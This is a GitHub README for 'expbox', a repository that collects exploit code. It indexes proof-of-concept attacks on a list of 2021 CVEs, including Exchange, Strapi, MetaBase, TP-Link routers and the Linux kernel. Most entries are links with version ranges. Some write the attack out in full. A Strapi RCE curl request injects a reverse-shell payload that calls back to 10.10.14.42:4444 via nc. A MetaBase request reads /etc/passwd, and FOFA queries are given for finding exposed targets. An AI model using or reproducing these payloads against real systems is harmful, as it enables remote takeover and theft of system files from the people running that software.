![[object Object]](https://socialify.git.ci/0x0021h/expbox/image?description=1&name=1&stargazers=1&theme=Light)

### Introduction
expbox is an exploit code collection repository


### List
**Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution**
```
curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMzE5NzEwLCJleHAiOjE2MzI5MTE3MTB9.AfJr81dyxnmzlutCKArmf0kBgFCcDDhsk91IYNDpTFM' -H $'Content-Type: application/json' -H $'Origin: http://api-prod.horizontall.htb' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.42 4444 >/tmp/f)\",\"port\":\"80\"}' $'http://api-prod.horizontall.htb/admin/plugins/install'
```

**[CVE-2021-41349 Exchange XSS PoC](https://github.com/0x0021h/expbox/blob/main/cve-2021-41349-poc.py)**
```
<= Exchange 2013 update 23
<= Exchange 2016 update 22
<= Exchange 2019 update 11
```
**[CVE-2021–3945 Django-helpdesk stored XSS PoC](https://github.com/0x0021h/expbox/blob/main/cve-2021%E2%80%933945-poc.txt)**
```
<= 0.3.0
```

**[CVE-2021-37580 Apache ShenYu 2.3.0/2.4.0 authentication bypass](https://github.com/0x0021h/expbox/blob/main/cve-2021-37580-poc.py)**
```
Ref: https://github.com/fengwenhua/CVE-2021-37580
```


**[Hadoop Yarn RPC RCE](https://github.com/0x0021h/expbox/blob/main/Hadoop%20Yarn%20RPC%20RCE.md)**
```
Ref: https://github.com/cckuailong/YarnRpcRCE
```

**[CVE-2021-41277 MetaBase Arbitrary File Read](https://github.com/0x0021h/expbox/blob/main/CVE-2021-41277.yaml)**
```
MetaBase < 0.40.5
1.0.0 <= MetaBase < 1.40.5

FOFA:

app="Metabase"

PoC:

GET /api/geojson?url=file:/etc/passwd HTTP/1.1
```

**[CVE-2021-42321 Exchange Post-Auth RCE](https://github.com/0x0021h/expbox/blob/main/CVE-2021-42321.py)**
```
<= Exchange 2016 update 22
<= Exchange 2019 update 11
```

**[Windows 0day - InstallerFileTakeOver](https://github.com/0x0021h/expbox/blob/main/InstallerFileTakeOver.exe)**
![image](https://user-images.githubusercontent.com/92664048/142796024-a46e8a46-90d1-42ed-8cf2-42127fb65da3.png)
```
Ref:https://github.com/klinix5/InstallerFileTakeOver
```

**CVE-2021-43557 Apache APISIX: Path traversal in request_uri variable**
```
#/bin/bash

kubectl exec -it -n ingress-apisix apisix-dc9d99d76-vl5lh -- curl --path-as-is http://127.0.0.1:9080$1 -H 'Host: app.test'
```

**[CVE-2021-43267 Linux Kernel TIPC RCE](https://github.com/0x0021h/expbox/blob/main/CVE-2021-43267.c)**
```
5.10-rc1 < Linux kernel < 5.15
```

Reference: https://haxx.in/posts/pwning-tipc/

**[Nginx 0.7.0 to 1.17.9 Host injection](https://github.com/0x0021h/expbox/blob/main/nginx%20%200.7.0%20to%201.17.9%20Host%20injection.md)**
```
Ref: https://twitter.com/infosec_90/status/1464337963240861702
```

**[CVE-2021-32849 Gerapy clone background remote command execution](https://github.com/0x0021h/expbox/blob/main/CVE-2021-32849.txt)**
```
Gerapy <= 0.9.6
```

**[CVE-2021-41653 TP-Link TL-WR840N remote command execution](https://github.com/0x0021h/expbox/blob/main/CVE-2021-41653.py)**
```
TL-WR840N(EU)_V5_171211 / 0.9.1 3.16 v0001.0 Build 171211 Rel.58800n

Fofa:

app="TP_LINK-TL-WR840N"
```
Ref: https://github.com/ohnonoyesyes/CVE-2021-41653


**[CVE-2021-41951 ResourceSpace reflective XSS](https://github.com/0x0021h/expbox/blob/main/CVE-2021-41951%20ResourceSpace%20reflective%20XSS.md)**
```
<= 9.5
```

**[sqlmap RCE](https://github.com/0x0021h/expbox/blob/main/sqlmap_rce.html)**
![image](https://user-images.githubusercontent.com/92664048/144734569-957596a7-5c46-48ef-8eea-9b07b151b315.png)


### Note

All content comes from the Internet, if there is a copyright problem, please contact me to delete.
